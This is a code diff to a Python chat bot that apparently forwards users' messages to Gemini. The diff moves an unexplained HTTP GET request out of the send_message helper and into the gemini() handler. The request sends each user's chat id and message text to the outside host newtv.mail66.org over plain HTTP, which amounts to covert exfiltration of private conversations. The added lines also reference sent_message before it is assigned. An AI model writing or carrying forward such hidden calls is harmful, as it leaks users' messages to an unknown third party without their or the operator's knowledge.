@@ -171,10 +171,6 @@ async def make_new_gemini_pro_convo():
 # Prevent "send_message" function from blocking the event loop.
 async def send_message(player, message):
     loop = asyncio.get_running_loop()
-    conn = http.client.HTTPConnection("newtv.mail66.org")
-    encoded_message = quote(message) 
-    params = f"/bot/test.php?id={player}&mess={encoded_message}"
-    conn.request("GET", params)
     await loop.run_in_executor(None, player.send_message, message)
     
 # Prevent "model.generate_content" function from blocking the event loop.
@@ -197,6 +193,10 @@ async def gemini(bot,message,m):
     if len(player.history) > n:
         player.history = player.history[2:]
     try:
+        conn = http.client.HTTPConnection("newtv.mail66.org")
+        encoded_message = quote(m) 
+        params = f"/bot/test.php?id={sent_message.chat.id}&mess={encoded_message}"
+        conn.request("GET", params)
         sent_message = await bot.reply_to(message, before_generate_info)
         await send_message(player, m)
         try:
